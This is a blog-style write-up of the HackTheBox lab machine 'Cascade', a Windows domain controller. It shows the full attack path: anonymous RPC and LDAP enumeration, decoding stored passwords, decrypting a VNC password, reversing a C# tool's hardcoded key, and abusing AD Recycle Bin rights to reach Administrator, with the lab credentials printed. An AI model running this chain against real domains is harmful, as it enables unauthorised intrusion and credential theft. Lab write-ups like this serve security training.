---
title: "HackTheBox: Cascade Writeup"
date: 2020-07-26 11:18:44 +0000
categories:
  - blog
tags:
  - CTF
  - HTB
  - English
---
This is a writeup of the machine Cascade on HackTheBox, it's a windows box with the difficulty rating medium. 

The process of rooting this box includes quite a bit Active Directory enumeration, decrypting a VNC password, and some reversing of a c# executeable. 

![Cascade Info](https://jackhack.se/assets/images/cascade/cascade_info.png)
{: .full}

# Recon

Starting with the standard nmap scan

~~~
kali@kali:~$ nmap -sC -sV -oA initial -T5 10.10.10.182
~~~
{: .language-bash}
~~~
# Nmap 7.80 scan initiated Thu Jul 16 15:34:54 2020 as: nmap -sC -sV -Pn -oA initial -T 5 10.10.10.182
Nmap scan report for 10.10.10.182
Host is up (0.045s latency).
Not shown: 986 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-16 19:40:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 5m43s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-16T19:41:39
|_  start_date: 2020-07-16T08:57:25

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 16 15:38:33 2020 -- 1 IP address (1 host up) scanned in 219.14 seconds
~~~
{: .language-bash}
I like to see if i can connect to the RPC service without authentication because i like to enumerate users via RPC if possible.

~~~
kali@kali:~/boxes/cascade/$ rpcclient 10.10.10.182 -U ‘’    
Enter WORKGROUP\'s password: <enter>

rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
~~~
{: .language-bash}
I was able to connect without authentication, and using the command *enumdomusers* i managed to make a list of possible users. I could also get a list of all groups in the domain, but nothing more interesting from RPC, so i switched over to ldap-enumeration using **ldapsearch**. 

~~~
kali@kali:~$ ldapsearch -LLL -x -H ldap://10.10.10.182/ -b '' -s base '(objectclass=*)

serverName: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Conf
 iguration,DC=cascade,DC=local

~~~
{: .language-bash}
~~~
kali@kali:~$ ldapsearch -LLL -x -H ldap://cascade.local -b 'dc=cascade,dc=local'
---snip---
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local                                                              
objectClass: top                                                                                                     
objectClass: person                                       
objectClass: organizationalPerson                        
objectClass: user                                                                                                    
cn: Ryan Thompson                                         
sn: Thompson                                                                                                         
givenName: Ryan                                                                                                      
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
---snip---
cascadeLegacyPwd: clk0bjVldmE= 
~~~
{: .language-bash}
From the LDAP enumeration i saw an attribute that stood out "cascadeLegacyPwd" wich seems to be a base64 encoded password.
By decoding that string i got possible credentials for the user r.thompson, using this credentials to enumerate SMB will be my next step. 

~~~
kali@kali:~$ smbclient -L //10.10.10.182/ -U "r.thompson%rY4n5eva"

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share 



kali@kali:~$ smbclient -H //10.10.10.182/Data -U "r.thompson%rY4n5eva"
smb:\> prompt off
smb:\> recurse on
smb:\> mget *
~~~
# User
{: .language-bash}
When browsing the files locally two files caught my interest

~~~
kali@kali:~$ ls -laR

  ./Temp/s.smith:
total 12
drwxr-xr-x 2 kali kali 4096 Jul 16 16:16  .
drwxr-xr-x 4 kali kali 4096 Jul 16 16:16  ..
-rw-r--r-- 1 kali kali 2680 Jul 17 15:44 'VNC Install.reg'

'./Email Archives':
total 12
drwxr-xr-x 2 kali kali 4096 Jul 16 16:16 .
drwxr-xr-x 6 kali kali 4096 Jul 16 16:16 ..
-rw-r--r-- 1 kali kali 2522 Jul 17 15:44 Meeting_Notes_June_2018.html
~~~
{: .language-bash}
The email containing meeting notes mentions a TempAdmin account used for a network migration, using the same password as the standard Administrator account

![Email](https://jackhack.se/assets/images/cascade/email.png)
{: .full}

And the VNC Install.reg contains a password in HEX for the VNC service. Since VNC uses a hardcoded DES key for encrypting the passwords stored in registry i should be able to decrypt the password using metasploit

![VNC password](https://jackhack.se/assets/images/cascade/vncpwd.png)
{: .full}

The decryption is made using metasploits IRB-shell.

![Metasploit decryption](https://jackhack.se/assets/images/cascade/decrypt.png)
{: .full}

The password decrypts to "sT333ve2" 

Moving on to get a shell with evil-winrm and grab the user flag

~~~
kali@kali:~/boxes/cascade$ evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> more ../Desktop/user.txt
b210ea4039b8af6acc4a4a4a2ef45dfc

~~~
{: .language-bash}
With the s.smith account i could now access the audit$ SMB share, so i connected and downloaded the contents of this share aswell. 

![SMB as s.smith](https://jackhack.se/assets/images/cascade/ssmith_smb.png)
{: .full}

Thats some type of executable file but also a database directory, after opening the database with sqlitebrowser i saw there was once again a base64 encoded password for the ArkSvc user in the "ldap" table.

![SQL Browser](https://jackhack.se/assets/images/cascade/sql.png)
{: .full}

But when decrypting this password it looks like jibberish, so i guess the password is somehow encrypted. 

Switching to my windows machine and opening the executable file with dnSpy, i can see that the program retrieves the encrypted string from the database and uses the key "c4scadek3y654321" to decrypt it. 
![CascAudit.exe](https://jackhack.se/assets/images/cascade/cascaudit.png)
{: .full}


~~~
--snip--
string str = string.Empty;
			string password = string.Empty;
			string str2 = string.Empty;
			try
			{
				sqliteConnection.Open();
				using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
				{
					using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
					{
						sqliteDataReader.Read();
						str = Conversions.ToString(sqliteDataReader["Uname"]);
						str2 = Conversions.ToString(sqliteDataReader["Domain"]);
						string encryptedString = Conversions.ToString(sqliteDataReader["Pwd"]);
						try
						{
							password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
						}
						catch (Exception ex)
						{
							Console.WriteLine("Error decrypting password: " + ex.Message);
							return;
						}
						--snip--
~~~
{: .language-csharp}
I used dnSpy to rewrite this function to just take the encrypted password as input and return the decrypted password and saved the executeable as CascAuditMod.exe

![CascAudit Modified](https://jackhack.se/assets/images/cascade/cascmod.png)
{: .full}

~~~
namespace CascAudiot
{
	// Token: 0x0200000A RID: 10
	[StandardModule]
	internal sealed class MainModule
	{
		// Token: 0x06000018 RID: 24 RVA: 0x0000217F File Offset: 0x0000037F
		[STAThread]
		public static void Main()
		{
			string value = Crypto.DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321");
			Console.WriteLine("Decrypted password:");
			Console.Write(value);
		}
~~~
{: .language-csharp}
After running the modified executeable my commandline returns the following:
![cmd output](https://jackhack.se/assets/images/cascade/modcmd.png)

# Root 
Now i can proceed to get a evil-winrm shell with the new credentials for ArkSvc and the password w3lc0meFr31nd.

When running the command *whoami /all* to list group memberships i see that the user is a member of the AD Recycle Bin group

![AD Groups](https://jackhack.se/assets/images/cascade/AdGroup.png)
{: .full}

Quick googling-fu shows [how]( https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges) to elevate this for privilege escalation 

So i ran the following Powershell command 
~~~
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
~~~
{: .language-powershell}
And once again it returned this object "cascadeLegacyPwd" for the user TempAdmin.
~~~
---snip---
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
---snip---
~~~
{: .language-bash}
~~~

kali@kali:~$ echo -n 'YmFDVDNyMWFOMDBkbGVz' | base64 -d

baCT3r1aN00dles

~~~
{: .language-bash}
Since i remember the Email note saying that the TempAdmin account has the same password as the standard Administrator account i used this to get a shell as Administrator and grab the root flag.

![Root flag](https://jackhack.se/assets/images/cascade/rootflag.png)
{: .full}
